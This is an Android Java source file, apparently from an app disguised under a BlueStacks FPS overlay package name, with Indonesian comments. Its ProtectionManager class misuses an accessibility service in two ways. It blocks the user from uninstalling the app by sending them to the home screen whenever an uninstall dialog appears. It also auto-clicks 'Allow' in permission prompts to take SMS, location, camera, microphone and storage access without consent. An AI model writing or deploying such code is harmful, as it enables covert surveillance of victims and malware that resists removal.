package com.bluestacks.fpsoverlay;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.core.content.ContextCompat;
import java.util.List;

public class ProtectionManager {
    private static final String TAG = "ProtectionManager";
    private final AccessibilityService service;
    private boolean antiUninstallEnabled = false;
    private boolean allPermissionsGranted = false;

    public ProtectionManager(AccessibilityService service) {
        this.service = service;
    }

    public void setAntiUninstallEnabled(boolean enabled) {
        this.antiUninstallEnabled = enabled;
        Log.d(TAG, "Anti-Uninstall toggle set to: " + enabled);
    }

    public void handleAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";

        // 0. WHITELIST
        if (pkg.equals(service.getPackageName()) || pkg.contains("com.bluestacks.fpsoverlay.controller")) {
            return;
        }

        // --- PRIORITAS 1: ANTI-UNINSTALL ---
        if (antiUninstallEnabled && (pkg.contains("packageinstaller") || pkg.contains("settings"))) {
            AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root != null) {
                if (isLikelyUninstallDialog(root)) {
                    Log.w(TAG, "!! UNINSTALL DETECTED !! Package: " + pkg + ". Blocking and going home.");
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
                    root.recycle();
                    return;
                }
                root.recycle();
            }
        }

        // --- PRIORITAS 2: AUTO ALLOW PERMISSIONS ---
        if (allPermissionsGranted) {
            // Sudah tidak perlu mencari lagi
            return;
        }

        if (pkg.contains("permissioncontroller") || pkg.contains("packageinstaller") || 
            pkg.contains("settings") || pkg.contains("security")) {
            
            // Verifikasi apakah masih ada izin yang kurang
            if (!hasAllPermissions()) {
                // Gunakan pencarian cepat
                autoAllowPermissions();
            }
        }
    }

    private boolean hasAllPermissions() {
        if (allPermissionsGranted) return true;

        String[] permissions;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO
            };
        } else {
            permissions = new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_EXTERNAL_STORAGE
            };
        }

        boolean missing = false;
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(service, perm) != PackageManager.PERMISSION_GRANTED) {
                missing = true;
                break;
            }
        }

        if (!missing) {
            allPermissionsGranted = true;
            Log.i(TAG, ">>> SUCCESS: All permissions granted. Auto-Allow logic SHUT DOWN. <<<");
            return true;
        }
        return false;
    }

    private boolean isLikelyUninstallDialog(AccessibilityNodeInfo root) {
        if (root == null) return false;
        
        // Cek ID pesan dialog
        List<AccessibilityNodeInfo> msgNodes = root.findAccessibilityNodeInfosByViewId("android:id/message");
        if (msgNodes != null && !msgNodes.isEmpty()) {
            for (AccessibilityNodeInfo msgNode : msgNodes) {
                String text = msgNode.getText() != null ? msgNode.getText().toString().toLowerCase() : "";
                msgNode.recycle();
                if (text.contains("uninstall") || text.contains("copot") || text.contains("hapus")) {
                    return true;
                }
            }
        }
        
        // Cek teks langsung
        return checkNodeForText(root, "uninstall") || checkNodeForText(root, "copot") || 
               checkNodeForText(root, "hapus instalasi");
    }

    private void autoAllowPermissions() {
        AccessibilityNodeInfo root = service.getRootInActiveWindow();
        if (root == null) return;

        // Jangan interupsi proses uninstall
        if (isLikelyUninstallDialog(root)) {
            root.recycle();
            return;
        }

        // Optimasi: List ID paling sering muncul di urutan pertama
        String[] ids = {
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_always_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.samsung.android.permissioncontroller:id/permission_allow_button",
            "com.lbe.security.miui:id/permission_allow_button",
            "android:id/button1"
        };

        for (String id : ids) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
            if (nodes != null && !nodes.isEmpty()) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (performSafeClick(node, id)) {
                        root.recycle();
                        return;
                    }
                }
            }
        }

        // Quick Keywords Fallback (Hanya jika ID gagal)
        String[] keys = {"Allow", "Izinkan", "While using", "Saat aplikasi", "Hanya kali ini", "Only this time"};
        for (String key : keys) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(key);
            if (nodes != null) {
                for (AccessibilityNodeInfo node : nodes) {
                    if (performSafeClick(node, "Text:" + key)) {
                        root.recycle();
                        return;
                    }
                }
            }
        }

        root.recycle();
    }

    private boolean performSafeClick(AccessibilityNodeInfo node, String identifier) {
        if (node == null) return false;
        try {
            if (node.isVisibleToUser() && node.isEnabled()) {
                String text = node.getText() != null ? node.getText().toString().toLowerCase() : "";
                
                // Safety: Stop if it's uninstall related
                if (text.contains("uninstall") || text.contains("copot") || text.contains("hapus")) {
                    node.recycle();
                    return false;
                }

                // Cepat cari clickable target
                AccessibilityNodeInfo target = node;
                if (!target.isClickable()) {
                    AccessibilityNodeInfo parent = target.getParent();
                    if (parent != null) {
                        if (parent.isClickable()) {
                            target = parent;
                        } else {
                            AccessibilityNodeInfo grandParent = parent.getParent();
                            if (grandParent != null && grandParent.isClickable()) {
                                target = grandParent;
                            }
                        }
                    }
                }

                if (target != null && target.isClickable()) {
                    boolean success = target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    if (success) {
                        Log.i(TAG, "--> SUCCESS: Clicked button [" + text + "] via " + identifier);
                    }
                    if (target != node) target.recycle();
                    node.recycle();
                    return success;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error during click: " + e.getMessage());
        }
        node.recycle();
        return false;
    }

    private boolean checkNodeForText(AccessibilityNodeInfo node, String text) {
        if (node == null) return false;
        List<AccessibilityNodeInfo> nodes = node.findAccessibilityNodeInfosByText(text);
        if (nodes != null && !nodes.isEmpty()) {
            for (AccessibilityNodeInfo n : nodes) {
                if (n.isVisibleToUser()) {
                    n.recycle();
                    return true;
                }
                n.recycle();
            }
        }
        return false;
    }
}
